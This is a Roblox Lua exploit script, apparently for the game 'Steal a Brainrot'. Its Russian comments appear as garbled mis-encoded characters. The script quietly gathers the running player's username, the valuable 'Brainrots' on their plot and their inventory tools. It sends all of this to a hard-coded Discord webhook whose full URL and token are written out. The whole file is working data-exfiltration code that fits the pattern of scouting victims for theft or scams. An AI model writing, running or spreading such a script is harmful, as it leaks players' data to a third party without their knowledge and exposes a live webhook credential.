local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")

local localPlayer = Players.LocalPlayer

-- –°–ø–∏—Å–æ–∫ –Ω–∞–∑–≤–∞–Ω–∏–π Brainrots, –∫–æ—Ç–æ—Ä—ã–µ –Ω—É–∂–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å
local allowedBrainrots = {
    "Los Tralaleritos",
    "Garamararam",
    "Vacca Saturno Saturnita",
    "Blueberrinni Octopussini",
    "67",
    "Pot Hotspot",
    "Dragon Cannelloni",
    "Brri Brri Dicus Bombicus",
    "Crazylone Pizalone"
}

-- === –ü–æ–∏—Å–∫ —Å–≤–æ–µ–≥–æ –ø–ª–æ—Ç–∞ ===
local function findPlayerPlot()
    local plots = Workspace:FindFirstChild("Plots")
    if not plots then return nil end

    for _, plot in ipairs(plots:GetChildren()) do
        if plot:FindFirstChild("PlayerSign") and plot.PlayerSign:FindFirstChild("BillboardGui") then
            local label = plot.PlayerSign.BillboardGui:FindFirstChild("TextLabel")
            if label and label.Text == localPlayer.DisplayName then
                return plot
            end
        end
    end
    return nil
end

-- === –°–±–æ—Ä Brainrots –ø–æ —Ñ–∏–ª—å—Ç—Ä—É ===
local function collectBrainrots(plot)
    local brainrotsText = ""
    local container = plot:FindFirstChild("Brainrots")
    if not container then
        return ""
    end

    for i = 1, 17 do
        local node = container:FindFirstChild(tostring(i))
        if node and node:FindFirstChild("Brainrot") then
            local br = node.Brainrot
            local ui = br:FindFirstChild("PlatformUI")
            if ui and ui:FindFirstChild("Title") then
                local text = ui.Title.Text
                if text and text ~= "" then
                    for _, allowed in ipairs(allowedBrainrots) do
                        if string.find(text, allowed) then
                            brainrotsText = brainrotsText .. ("Brainrot %d: %s\n"):format(i, text)
                            break
                        end
                    end
                end
            end
        end
    end

    return brainrotsText
end

-- === –°–±–æ—Ä –∏–Ω–≤–µ–Ω—Ç–∞—Ä—è —Å —Ñ–∏–ª—å—Ç—Ä–æ–º Shovel –∏ Bat ===
local function collectInventory()
    local invText = ""
    local items = {}

    local function addItemsFrom(container)
        if not container then return end
        for _, item in ipairs(container:GetChildren()) do
            if item:IsA("Tool") then
                local nameLower = item.Name:lower()
                if not string.find(nameLower, "shovel") and not string.find(nameLower, "bat") then
                    table.insert(items, item.Name)
                end
            end
        end
    end

    addItemsFrom(localPlayer:FindFirstChild("Backpack"))
    addItemsFrom(localPlayer.Character)

    if #items > 0 then
        invText = "\n--- Inventory ---\n"
        for _, name in ipairs(items) do
            invText = invText .. "- " .. name .. "\n"
        end
    end

    return invText
end

-- === –û—Å–Ω–æ–≤–Ω–æ–π –∑–∞–ø—É—Å–∫ ===
local plot = findPlayerPlot()
local brainrots = plot and collectBrainrots(plot) or ""
local inventory = collectInventory()
local combined = brainrots .. inventory

if combined == "" then
    combined = "‚ö†Ô∏è –ü—É—Å—Ç–æ"
end

-- === –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Discord ===
request({
    Url = "https://discord.com/api/webhooks/1417846130619977738/mgmCuOeNpaNOBQddZUtCPaeheSjaBWdLNLfPPg2xk6-533OjiGgbjxwmkKPsQO7TK9ep",
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = HttpService:JSONEncode({
        ["embeds"] = {{
            ["title"] = "**Brainrots + Inventory Report**",
            ["color"] = 65280,
            ["fields"] = {
                {
                    ["name"] = "üë§ Username",
                    ["value"] = localPlayer.Name,
                    ["inline"] = false
                },
                {
                    ["name"] = "ü™ê Brainrots + Inventory",
                    ["value"] = combined,
                    ["inline"] = false
                }
            }
        }}
    })
})
